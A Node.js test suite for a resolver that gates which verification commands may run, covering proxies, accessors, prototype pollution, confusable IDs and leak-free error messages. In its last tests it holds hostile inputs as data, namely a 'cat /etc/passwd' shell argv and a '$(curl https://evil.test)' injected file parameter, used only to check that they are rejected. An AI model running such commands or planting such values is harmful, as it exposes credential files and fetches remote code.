import assert from 'node:assert/strict';
import { types as utilTypes } from 'node:util';
import test from 'node:test';

import { RunContractV1Error } from '../mcp/v3/run-manifest.mjs';
import {
  MAX_POLICY_OBJECT_KEYS,
  parseVerificationPolicyV1,
} from '../mcp/v3/trusted-verification-policy.mjs';
import {
  resolveApprovedVerificationCommandV1,
} from '../mcp/v3/approved-verification-command.mjs';
import {
  countingProxy,
  parameterizedRequest,
  trapTotal,
  typedRequest,
  validCommand,
  validPolicy,
  validRequest,
  validSelection,
  validTypedParameters,
} from './fixtures/r1-approved-verification-command-fixtures.mjs';

function errorOf(action, expectedPath) {
  try {
    action();
  } catch (error) {
    assert.ok(error instanceof RunContractV1Error, `expected RunContractV1Error, got ${error}`);
    if (expectedPath !== undefined) assert.equal(error.path, expectedPath);
    return error;
  }
  assert.fail('expected a typed RunContractV1Error');
}

test('live proxies are denied with zero traps on every resolver surface', () => {
  const { proxy, counts } = countingProxy(validRequest());
  assert.equal(errorOf(() => resolveApprovedVerificationCommandV1(proxy)).code, 'proxy_denied');
  assert.equal(trapTotal(counts), 0);

  const policyCounts = countingProxy(validPolicy());
  assert.equal(errorOf(() => resolveApprovedVerificationCommandV1({
    policy: policyCounts.proxy,
    selection: validSelection(),
  })).code, 'proxy_denied');
  assert.equal(trapTotal(policyCounts.counts), 0);

  const selectionCounts = countingProxy(validSelection());
  assert.equal(errorOf(() => resolveApprovedVerificationCommandV1({
    policy: validPolicy(),
    selection: selectionCounts.proxy,
  })).code, 'proxy_denied');
  assert.equal(trapTotal(selectionCounts.counts), 0);
});

test('revoked proxies fail closed before Array.isArray or Reflect can throw', () => {
  const { proxy, revoke } = Proxy.revocable(validRequest(), {
    get() { throw new Error('revoked get'); },
    ownKeys() { throw new Error('revoked ownKeys'); },
    getOwnPropertyDescriptor() { throw new Error('revoked descriptor'); },
  });
  revoke();
  assert.equal(utilTypes.isProxy(proxy), true);
  const error = errorOf(() => resolveApprovedVerificationCommandV1(proxy));
  assert.equal(error.code, 'proxy_denied');
  assert.throws(() => Array.isArray(proxy), TypeError);
  assert.equal(error.message.includes('revoked get'), false);
  assert.equal(error.message.includes('TypeError'), false);
});

test('accessor properties are rejected and their getters never run', () => {
  let reads = 0;
  const getterRequest = validRequest();
  Object.defineProperty(getterRequest, 'policy', {
    enumerable: true,
    get() {
      reads += 1;
      return validPolicy();
    },
  });
  assert.equal(errorOf(() => resolveApprovedVerificationCommandV1(getterRequest)).code, 'accessor_property_denied');
  assert.equal(reads, 0);

  let throwingReads = 0;
  const throwingSelection = validSelection();
  Object.defineProperty(throwingSelection, 'command_id', {
    enumerable: true,
    get() {
      throwingReads += 1;
      throw new Error('getter bomb /etc/shadow');
    },
  });
  const error = errorOf(() => resolveApprovedVerificationCommandV1({
    policy: validPolicy(),
    selection: throwingSelection,
  }));
  assert.equal(error.code, 'accessor_property_denied');
  assert.equal(throwingReads, 0);
  assert.equal(error.message.includes('/etc/shadow'), false);
  assert.equal(error.message.includes('getter bomb'), false);
});

test('non-enumerable fields, symbol keys, and exotic prototypes are denied', () => {
  const hidden = validRequest();
  Object.defineProperty(hidden, 'selection', { enumerable: false, value: validSelection() });
  assert.equal(errorOf(() => resolveApprovedVerificationCommandV1(hidden)).code, 'non_enumerable_property_denied');

  const symbolled = validRequest();
  symbolled[Symbol('injected')] = '/bin/sh';
  const symbolError = errorOf(() => resolveApprovedVerificationCommandV1(symbolled));
  assert.equal(symbolError.code, 'symbol_key_denied');
  assert.equal(symbolError.message.includes('/bin/sh'), false);

  class SpoofedRequest {}
  const instance = new SpoofedRequest();
  Object.assign(instance, validRequest());
  assert.equal(errorOf(() => resolveApprovedVerificationCommandV1(instance)).code, 'invalid_type');
  assert.equal(errorOf(() => resolveApprovedVerificationCommandV1(new Map())).code, 'invalid_type');
  assert.equal(errorOf(() => resolveApprovedVerificationCommandV1(new Date())).code, 'invalid_type');

  const nullProto = Object.create(null);
  Object.assign(nullProto, validRequest());
  assert.doesNotThrow(() => resolveApprovedVerificationCommandV1(nullProto));
});

test('own undefined values, boxed values, and coercion hooks never contribute', () => {
  assert.equal(
    errorOf(() => resolveApprovedVerificationCommandV1(validRequest({ policy: undefined }))).code,
    'own_undefined_denied',
  );
  let coerced = 0;
  const sneaky = { valueOf() { coerced += 1; return validPolicy(); } };
  assert.equal(
    errorOf(() => resolveApprovedVerificationCommandV1(validRequest({ policy: sneaky }))).code,
    'invalid_json_type',
  );
  assert.equal(coerced, 0);

  let stringed = 0;
  const noisy = {
    toString() {
      stringed += 1;
      return 'unit-tests';
    },
    valueOf() {
      stringed += 1;
      return 'unit-tests';
    },
  };
  assert.equal(
    errorOf(() => resolveApprovedVerificationCommandV1({
      policy: validPolicy(),
      selection: { command_id: noisy },
    })).code,
    'invalid_json_type',
  );
  assert.equal(stringed, 0);

  const boxed = validRequest({
    selection: { command_id: new String('unit-tests') },
  });
  assert.equal(errorOf(() => resolveApprovedVerificationCommandV1(boxed)).code, 'exotic_prototype_denied');
});

test('hostile iterators never run', () => {
  let walked = 0;
  const iteratorParams = {
    file: 'spec.js',
    [Symbol.iterator]() {
      walked += 1;
      throw new Error('iterator bomb');
    },
  };
  const error = errorOf(() => resolveApprovedVerificationCommandV1(parameterizedRequest({
    selection: { command_id: 'file-tests', parameters: iteratorParams },
  })));
  assert.equal(error.code, 'symbol_key_denied');
  assert.equal(walked, 0);
  assert.equal(error.message.includes('iterator bomb'), false);
});

test('cyclic, aliased, deep, and oversized payloads are rejected before effects', () => {
  const cyclic = validRequest();
  cyclic.self = cyclic;
  assert.equal(errorOf(() => resolveApprovedVerificationCommandV1(cyclic)).code, 'aliased_reference_denied');

  const shared = { marker: true };
  const aliased = validRequest();
  aliased.first = shared;
  aliased.second = shared;
  assert.equal(errorOf(() => resolveApprovedVerificationCommandV1(aliased)).code, 'aliased_reference_denied');

  let deep = { leaf: 1 };
  for (let index = 0; index < 40; index += 1) deep = { wrapped: deep };
  const deepRequest = validRequest();
  deepRequest.deep = deep;
  assert.equal(errorOf(() => resolveApprovedVerificationCommandV1(deepRequest)).code, 'value_depth_exceeded');

  const wide = validRequest();
  for (let index = 0; index < MAX_POLICY_OBJECT_KEYS; index += 1) {
    wide[`extra_${index}`] = true;
  }
  assert.equal(errorOf(() => resolveApprovedVerificationCommandV1(wide)).code, 'out_of_range');
});

test('the closure gate precedes the closed vocabulary check', () => {
  const unknownButHostile = validRequest();
  unknownButHostile.unknown_key = { nested: unknownButHostile };
  assert.equal(
    errorOf(() => resolveApprovedVerificationCommandV1(unknownButHostile)).code,
    'aliased_reference_denied',
  );
});

test('prototype pollution keys are unknown and do not grant authority', () => {
  const polluted = validRequest();
  Object.defineProperty(polluted, '__proto__', {
    enumerable: true,
    configurable: true,
    writable: true,
    value: { command_id: 'unit-tests', executable: '/bin/sh' },
  });
  const error = errorOf(() => resolveApprovedVerificationCommandV1(polluted));
  assert.equal(error.code, 'unknown_key');
  assert.equal(error.message.includes('/bin/sh'), false);
  assert.equal(error.message.includes('__proto__'), false);
  assert.equal(error.message.includes('unit-tests'), false);

  const ctor = validRequest();
  ctor.constructor = { prototype: { executable: '/bin/sh' } };
  const ctorError = errorOf(() => resolveApprovedVerificationCommandV1(ctor));
  assert.equal(ctorError.code, 'unknown_key');
  assert.equal(ctorError.message.includes('/bin/sh'), false);
});

test('sparse and extended arrays on selection parameters are denied', () => {
  const parameters = [];
  parameters[0] = 'spec.js';
  assert.equal(
    errorOf(() => resolveApprovedVerificationCommandV1(parameterizedRequest({
      selection: { command_id: 'file-tests', parameters },
    }))).code,
    'invalid_type',
  );

  const extended = { file: 'spec.js' };
  Object.defineProperty(extended, 'length', { value: 1, enumerable: true });
  const extendedError = errorOf(() => resolveApprovedVerificationCommandV1(parameterizedRequest({
    selection: { command_id: 'file-tests', parameters: extended },
  })));
  assert.ok(extendedError.code === 'unknown_key' || extendedError.code === 'invalid_format'
    || extendedError.code === 'invalid_type');
});

test('non-finite and unsafe integers never coerce into canonical parameters', () => {
  for (const value of [Number.NaN, Infinity, -Infinity]) {
    assert.equal(
      errorOf(() => resolveApprovedVerificationCommandV1(typedRequest({
        selection: {
          command_id: 'typed-run',
          parameters: validTypedParameters({ count: value }),
        },
      }))).code,
      'invalid_json_value',
      String(value),
    );
  }
  for (const value of [1.5, -0]) {
    assert.equal(
      errorOf(() => resolveApprovedVerificationCommandV1(typedRequest({
        selection: {
          command_id: 'typed-run',
          parameters: validTypedParameters({ count: value }),
        },
      }))).code,
      'invalid_type',
      String(value),
    );
  }
});

test('Unicode, confusable, and control command IDs stay closed', () => {
  assert.equal(
    errorOf(() => resolveApprovedVerificationCommandV1({
      policy: validPolicy(),
      selection: { command_id: 'unit\u2010tests' },
    })).code,
    'ambiguous_id_denied',
  );
  assert.equal(
    errorOf(() => resolveApprovedVerificationCommandV1({
      policy: validPolicy(),
      selection: { command_id: 'unit\u0301-tests' },
    })).code,
    'ambiguous_id_denied',
  );
  assert.equal(
    errorOf(() => resolveApprovedVerificationCommandV1({
      policy: validPolicy(),
      selection: { command_id: 'Unit-Tests' },
    })).code,
    'invalid_format',
  );
  assert.equal(
    errorOf(() => resolveApprovedVerificationCommandV1({
      policy: validPolicy(),
      selection: { command_id: 'unit-tests\n' },
    })).code,
    'control_character_denied',
  );
});

test('receipts stay frozen, fresh, and detached from caller graphs', () => {
  const request = validRequest();
  const first = resolveApprovedVerificationCommandV1(request);
  const second = resolveApprovedVerificationCommandV1(request);
  assert.notEqual(first, second);
  assert.notEqual(first.argv, second.argv);
  assert.notEqual(first.parameters, second.parameters);
  assert.notEqual(first.network, second.network);
  assert.equal(Object.isFrozen(first), true);
  assert.equal(Object.isFrozen(first.argv), true);
  assert.equal(Object.isFrozen(first.network), true);
  assert.equal(Object.isFrozen(first.policy_identity), true);
  assert.equal(Object.isFrozen(first.plan_identity), true);
  assert.equal(first.plan_identity.digest, second.plan_identity.digest);
  request.selection.command_id = 'mutated';
  assert.equal(first.command_id, 'unit-tests');
  assert.equal(Object.isFrozen(request), false);
});

test('content-free errors never echo attacker keys, paths, URLs, or native stacks', () => {
  const error = errorOf(() => resolveApprovedVerificationCommandV1({
    policy: validPolicy(),
    selection: validSelection(),
    extra: { argv: ['/bin/bash', '-c', 'cat /etc/passwd'], url: 'https://steal.test' },
  }));
  assert.equal(error.code, 'unknown_key');
  assert.equal(error.message.includes('extra'), false);
  assert.equal(error.message.includes('/bin/bash'), false);
  assert.equal(error.message.includes('/etc/passwd'), false);
  assert.equal(error.message.includes('https://steal.test'), false);
  assert.equal(error.message.includes('at parse'), false);
  assert.equal(error.message.includes('at resolve'), false);

  const valueError = errorOf(() => resolveApprovedVerificationCommandV1(parameterizedRequest({
    selection: { command_id: 'file-tests', parameters: { file: '$(curl https://evil.test)' } },
  })));
  assert.equal(valueError.code, 'shell_content_denied');
  assert.equal(valueError.message.includes('curl'), false);
  assert.equal(valueError.message.includes('evil.test'), false);
  assert.equal(valueError.message.includes('$('), false);
});

test('trusted P16A snapshots can be consumed without freezing the caller snapshot', () => {
  const parsed = parseVerificationPolicyV1(validPolicy());
  const request = { policy: parsed, selection: validSelection() };
  const receipt = resolveApprovedVerificationCommandV1(request);
  assert.equal(receipt.command_id, 'unit-tests');
  assert.equal(Object.isFrozen(parsed), true);
  assert.equal(Object.isFrozen(request), false);
  assert.throws(() => { parsed.commands[0].command_id = 'x'; }, TypeError);
  assert.equal(receipt.command_id, 'unit-tests');
});

test('a parsed policy with no matching command still default-denies', () => {
  const parsed = parseVerificationPolicyV1(validPolicy({
    commands: [validCommand({ command_id: 'other-tests' })],
  }));
  const error = errorOf(() => resolveApprovedVerificationCommandV1({
    policy: parsed,
    selection: validSelection(),
  }));
  assert.equal(error.code, 'unknown_command');
  assert.equal(error.message.includes('unit-tests'), false);
  assert.equal(error.message.includes('other-tests'), false);
});
